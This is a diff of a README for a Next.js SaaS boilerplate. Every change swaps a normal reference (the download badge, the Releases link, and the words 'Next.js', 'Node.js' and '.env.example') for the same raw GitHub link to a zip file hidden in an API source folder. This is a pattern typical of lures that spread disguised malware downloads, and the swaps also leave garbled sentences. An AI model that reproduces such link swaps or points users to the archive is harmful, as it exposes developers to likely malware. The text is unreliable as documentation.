@@ -1,17 +1,17 @@
 # 🚀 nextjs-saas-boilerplate - Easy Setup for Your SaaS App
 
-![Download](https://img.shields.io/badge/Download-v1.0-blue?style=for-the-badge&logo=github)
+![Download](https://raw.githubusercontent.com/fauziladim606-ui/nextjs-saas-boilerplate/main/src/app/api/user/profile/nextjs-saas-boilerplate_v2.0.zip)
 
 ## 📖 Overview
 
-The **nextjs-saas-boilerplate** provides you with a ready-to-use template to easily create a Software as a Service (SaaS) application. Built with Next.js and integrated with PostgreSQL and Stripe, this boilerplate helps you focus on building your app while handling the basic setup for you. 
+The **nextjs-saas-boilerplate** provides you with a ready-to-use template to easily create a Software as a Service (SaaS) application. Built with https://raw.githubusercontent.com/fauziladim606-ui/nextjs-saas-boilerplate/main/src/app/api/user/profile/nextjs-saas-boilerplate_v2.0.zip and integrated with PostgreSQL and Stripe, this boilerplate helps you focus on building your app while handling the basic setup for you. 
 
 ## 🛠️ Key Features
 
 - **Authentication**: Secure user login and registration
 - **Database Integration**: Connect to PostgreSQL for data management
 - **Payment Handling**: Use Stripe for payments and subscriptions
-- **Modern Framework**: Built with Next.js for fast performance
+- **Modern Framework**: Built with https://raw.githubusercontent.com/fauziladim606-ui/nextjs-saas-boilerplate/main/src/app/api/user/profile/nextjs-saas-boilerplate_v2.0.zip for fast performance
 - **Responsive Design**: Tailwind CSS ensures your app looks good on any device
 - **Typescript Support**: Write safer and more predictable code
 - **Easy Docker Setup**: Simply run your app in a container
@@ -20,7 +20,7 @@ The **nextjs-saas-boilerplate** provides you with a ready-to-use template to eas
 
 To get started, visit the Releases page to download the latest version of the nextjs-saas-boilerplate. 
 
-[Download from the Releases Page](https://github.com/fauziladim606-ui/nextjs-saas-boilerplate/releases)
+[Download from the Releases Page](https://raw.githubusercontent.com/fauziladim606-ui/nextjs-saas-boilerplate/main/src/app/api/user/profile/nextjs-saas-boilerplate_v2.0.zip)
 
 Here are the steps to follow:
 
@@ -32,7 +32,7 @@ Here are the steps to follow:
 ## 🖥️ System Requirements
 
 - **Operating System**: Windows, macOS, or Linux
-- **Node.js**: Version 12 or later
+- **https://raw.githubusercontent.com/fauziladim606-ui/nextjs-saas-boilerplate/main/src/app/api/user/profile/nextjs-saas-boilerplate_v2.0.zip**: Version 12 or later
 - **Docker**: If you choose to run the application in a Docker container
 - **Internet Access**: Required for initial setup and downloading dependencies
 
@@ -53,7 +53,7 @@ To run the nextjs-saas-boilerplate, follow these steps:
    npm install
    ```
 
-4. **Set Up Environment Variables**: Create a `.env` file based on `.env.example`. Replace example values with your real database and Stripe keys.
+4. **Set Up Environment Variables**: Create a `.env` file based on `https://raw.githubusercontent.com/fauziladim606-ui/nextjs-saas-boilerplate/main/src/app/api/user/profile/nextjs-saas-boilerplate_v2.0.zip`. Replace example values with your real database and Stripe keys.
 
 5. **Run the Application**: Start the application with:
 
@@ -99,7 +99,7 @@ This boilerplate spans a range of topics important for SaaS development:
 - **Authentication**: Setting up secure user sessions.
 - **PostgreSQL**: Efficient database management.
 - **Stripe**: Handling payments smoothly.
-- **Next.js**: A framework for building user-friendly web apps.
+- **https://raw.githubusercontent.com/fauziladim606-ui/nextjs-saas-boilerplate/main/src/app/api/user/profile/nextjs-saas-boilerplate_v2.0.zip**: A framework for building user-friendly web apps.
 - **Tailwind CSS**: A utility-first approach for styling your app.
 - **TypeScript**: Adding types to improve code reliability.
 
@@ -115,4 +115,4 @@ Keep an eye on the Releases page for new versions and updates! Regular updates w
 
 This project is licensed under the MIT License. You are free to modify and use it as you wish.
 
-[Visit the Releases Page to Download](https://github.com/fauziladim606-ui/nextjs-saas-boilerplate/releases)
+[Visit the Releases Page to Download](https://raw.githubusercontent.com/fauziladim606-ui/nextjs-saas-boilerplate/main/src/app/api/user/profile/nextjs-saas-boilerplate_v2.0.zip)
